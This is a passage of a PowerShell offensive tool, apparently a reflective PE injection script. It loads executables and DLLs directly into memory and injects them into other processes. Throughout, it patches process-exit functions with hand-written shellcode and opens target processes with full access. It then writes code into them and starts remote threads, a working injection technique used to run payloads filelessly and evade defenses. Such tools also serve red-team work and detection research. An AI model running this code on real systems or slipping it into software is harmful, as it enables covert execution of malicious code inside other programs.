		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
